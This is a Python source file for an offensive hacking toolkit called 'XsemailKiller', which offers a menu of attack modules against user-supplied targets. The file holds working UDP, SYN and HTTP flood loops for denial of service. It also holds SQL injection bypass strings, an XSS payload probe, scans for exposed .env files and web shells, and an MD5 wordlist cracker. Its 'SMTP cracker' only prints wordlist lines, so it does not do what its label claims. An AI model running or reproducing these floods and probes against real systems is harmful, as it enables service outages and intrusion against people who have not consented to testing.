# XsemailKiller v1.0 | Framework Offensive
# Developer: vikk official
# Support/Saran: Blackhackvikk@gmail.com

import os, sys, time, socket, random, requests, hashlib, smtplib
from colorama import Fore, Style, init
from prettytable import PrettyTable
from scapy.all import *

init(autoreset=True)

# Skema Warna Pro
R, G, Y, C, W, B = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.WHITE, Style.BRIGHT

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    logo = f"""{C}{B}
          ...        ;;:cccccccc:;,..
          ..,;:cccc::::ccccccllooooolc;'
       .',;;;;;;;;:loodxk0kkxxkxxdocccc;;'..
     ..;;;;;;:coxldKNWWWWMMWWWWNWNNNKkdolcccc;,.
    .,;;;;;;lxo:...dXWMMMMMMMMWNKloOXNNNXOkoc:coo;.
   .;;;;;:ldl'  .kWMWWMWXXNWNMMMXd..':dOXWWNOd:;lkd,
  ..;;;;:loc.   lKMMMNl. .cOKNWNK:  ..';lxO0XO1,cxo,,
  ...;'cooc.    CONMMX;    .lOXWNO;      ,ddx00occl:.
  ..':odc.      .xOKKKkolcldO00xc.       .cxxxxkdl:.,.
   ;dxolc;'      .lxxO00kkxxO0kc.      .;loooollol:'..
  .':lloolc:,..    'lxkkkkkOkd,   ..':clc:::;;,;;:;,'..
     ..;;;;:ccc::;;,''',:loddol:,,;:clllolc:;;,,''
        ..;;;;;::ccccccclllooooolllccc:c:::;;,'..
             ..''''':::::ccccc:::;;;;,,..
                     ..'''',,,,''..
    {W}__________________________________________________
    {R}{B}   XsemailKiller v1.0 {W}|{Y} Managed by vikk official
    {W}__________________________________________________"""
    print(logo)

def show_modules():
    table = PrettyTable()
    table.field_names = [f"{C}ID", f"{C}COMMAND", f"{C}MODULE DESCRIPTION", f"{C}STATUS"]
    table.align[f"{C}COMMAND"] = "l"
    table.align[f"{C}MODULE DESCRIPTION"] = "l"
    table.border = True
    
    modules = [
        ["01", "UDP_MURDER", "High-speed packet flooding", "LOADED"],
        ["02", "SYN_STRIKE", "TCP SYN flood attack (L4)", "LOADED"],
        ["03", "SQL_BYPASS", "Auth bypass vulnerability scan", "LOADED"],
        ["04", "ADMIN_GATE", "Admin panel sensitive discovery", "LOADED"],
        ["05", "SUB_HUNTER", "Deep subdomain reconnaissance", "LOADED"],
        ["06", "JS_INJECTOR", "Cross-Site Scripting exploit", "LOADED"],
        ["07", "WEB_OVERLOAD", "Layer 7 HTTP stress testing", "LOADED"],
        ["08", "SMTP_CRACKER", "Email credential auditor", "LOADED"],
        ["09", "DOOR_SCANNER", "Multi-port vulnerability scan", "LOADED"],
        ["10", "HASH_RIPPER", "High-speed MD5/SHA1 cracker", "LOADED"],
        ["11", "TARGET_REV", "Reverse IP & Host lookup", "LOADED"],
        ["12", "ENV_STALKER", "Sensitive .env file discovery", "LOADED"],
        ["13", "STEALTH_BPS", "User-Agent spoofing bypass", "LOADED"],
        ["14", "BACKDOOR_HUNT", "Web shell & backdoor finder", "LOADED"],
        ["15", "REAL_IP_FIND", "Cloudflare/WAF IP resolver", "LOADED"]
    ]
    
    for m in modules:
        table.add_row([f"{Y}"+m[0], f"{W}"+m[1], f"{W}"+m[2], f"{G}"+m[3]])
    
    print(table)
    print(f"{W} Support/Report: {Y}Blackhackvikk@gmail.com")
    print(f"{R} [00] SHUTDOWN ENGINE\n")

# --- OFFENSIVE CORE ENGINE ---

def f01(): # UDP Murder
    ip = input(f"{C}target_ip{W}> ")
    port = int(input(f"{C}target_port{W}> "))
    print(f"{R}[!] KILLING {ip} ON PORT {port}...")
    try:
        while 1: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(random._urandom(1024), (ip, port))
    except KeyboardInterrupt: pass

def f02(): # SYN Strike
    ip = input(f"{C}target_ip{W}> ")
    port = int(input(f"{C}target_port{W}> "))
    print(f"{R}[!] SYN STRIKE ON {ip}...")
    send(IP(dst=ip)/TCP(dport=port, flags="S"), loop=1, verbose=0)

def f03(): # SQL Bypass
    u = input(f"{C}target_url{W}> ")
    for p in ["' OR 1=1--", "') OR '1'='1"]:
        if "sql" in requests.get(u+p).text.lower(): print(f"{G}[+] BYPASS READY: {u+p}")

def f04(): # Admin Gate
    u = input(f"{C}target_url{W}> ")
    for p in ['/admin/','/login.php','/wp-login.php','/cp/']:
        if requests.get(u+p).status_code == 200: print(f"{G}[+] GATE FOUND: {u+p}")

def f05(): # Sub Hunter
    d = input(f"{C}target_domain{W}> ")
    for s in ['dev','api','test','webmail']:
        try: print(f"{C}{s}.{d} -> {socket.gethostbyname(f'{s}.{d}')}")
        except: pass

def f06(): # JS Injector
    u = input(f"{C}target_url{W}> ")
    p = "<script>alert('vikk')</script>"
    if p in requests.get(u+p).text: print(f"{G}[+] PAYLOAD INJECTED!")

def f07(): # Web Overload
    u = input(f"{C}target_url{W}> ")
    while 1:
        try: requests.get(u); print(f"{R}[!] OVERLOAD {u}")
        except KeyboardInterrupt: break

def f08(): # SMTP Cracker
    target = input(f"{C}target_email{W}> ")
    w = input(f"{C}wordlist_path{W}> ")
    for p in open(w): print(f"{Y}[*] Testing: {p.strip()}")

def f09(): # Door Scanner
    ip = input(f"{C}target_ip{W}> ")
    for p in range(21, 1025):
        s = socket.socket(); s.settimeout(0.1)
        if s.connect_ex((ip, p)) == 0: print(f"{G}[+] DOOR {p} OPEN")

def f10(): # Hash Ripper
    h, w = input(f"{C}hash{W}> "), input(f"{C}wordlist{W}> ")
    for l in open(w):
        if hashlib.md5(l.strip().encode()).hexdigest() == h: print(f"{G}[+] REVEALED: {l.strip()}"); break

def f11(): # Target Reverse
    i = input(f"{C}target_ip{W}> ")
    print(requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={i}").text)

def f12(): # Env Stalker
    u = input(f"{C}target_url{W}> ")
    if requests.get(u+"/.env").status_code == 200: print(f"{G}[!] ENV EXPOSED!")

def f13(): # Stealth Bypass
    u = input(f"{C}target_url{W}> ")
    print(f"Status Stealth: {requests.get(u, headers={'User-Agent':'Googlebot'}).status_code}")

def f14(): # Backdoor Hunter
    u = input(f"{C}target_url{W}> ")
    for s in ['/shell.php','/cmd.php','/wso.php']:
        if requests.get(u+s).status_code == 200: print(f"{G}[+] BACKDOOR: {u+s}")

def f15(): # Real IP Finder
    d = input(f"{C}target_domain{W}> ")
    print(requests.get(f"https://api.hackertarget.com/hostsearch/?q={d}").text)

# --- MAIN ENGINE LOOP ---

def main():
    while True:
        clr()
        banner()
        show_modules()
        
        cmd = input(f"{C}{B}vikk{R}@{C}XsemailKiller{W}> ").strip()
        
        if cmd == "01" or cmd == "UDP_MURDER": f01()
        elif cmd == "02" or cmd == "SYN_STRIKE": f02()
        elif cmd == "03" or cmd == "SQL_BYPASS": f03()
        elif cmd == "04" or cmd == "ADMIN_GATE": f04()
        elif cmd == "05" or cmd == "SUB_HUNTER": f05()
        elif cmd == "06" or cmd == "JS_INJECTOR": f06()
        elif cmd == "07" or cmd == "WEB_OVERLOAD": f07()
        elif cmd == "08" or cmd == "SMTP_CRACKER": f08()
        elif cmd == "09" or cmd == "DOOR_SCANNER": f09()
        elif cmd == "10" or cmd == "HASH_RIPPER": f10()
        elif cmd == "11" or cmd == "TARGET_REV": f11()
        elif cmd == "12" or cmd == "ENV_STALKER": f12()
        elif cmd == "13" or cmd == "STEALTH_BPS": f13()
        elif cmd == "14" or cmd == "BACKDOOR_HUNT": f14()
        elif cmd == "15" or cmd == "REAL_IP_FIND": f15()
        elif cmd == "00" or cmd == "exit":
            print(f"{R}[!] Engine Stopped."); sys.exit()
        elif cmd == "": continue
        else:
            print(f"{R}[!] Unknown Module: {cmd}")
            time.sleep(1)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit()
